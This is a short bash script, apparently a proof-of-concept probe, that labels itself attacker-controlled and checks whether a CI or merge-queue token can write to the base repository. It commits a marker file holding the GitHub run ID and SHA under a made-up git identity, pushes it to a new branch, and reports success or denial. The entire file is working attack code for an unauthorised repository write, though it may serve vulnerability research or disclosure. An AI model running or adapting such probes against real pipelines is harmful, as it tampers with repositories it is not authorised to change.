#!/usr/bin/env bash
set -euo pipefail

echo "VM3_PROBE_SCRIPT=ATTACKER_CONTROLLED"
echo "VM3_MARKER_BRANCH=vm3-mq-token-marker-261003"

git config user.name "vm3-mq-token-probe"
git config user.email "vm3-mq-token-probe@example.invalid"

printf 'marker from run %s sha %s\n' "${GITHUB_RUN_ID:-unknown}" "${GITHUB_SHA:-unknown}" > vm3-token-marker.txt
git checkout -B vm3-mq-token-marker-local
git add vm3-token-marker.txt
git commit -m "VM3 MQ token marker 261003"

set +e
push_output="$(git push origin HEAD:refs/heads/vm3-mq-token-marker-261003 2>&1)"
push_rc=$?
set -e

printf '%s\n' "$push_output" | tail -n 12
echo "VM3_BASE_REPO_WRITE_RC=$push_rc"
if [ "$push_rc" -eq 0 ]; then
  echo "VM3_BASE_REPO_WRITE=SUCCESS"
else
  echo "VM3_BASE_REPO_WRITE=DENIED"
fi

exit 0
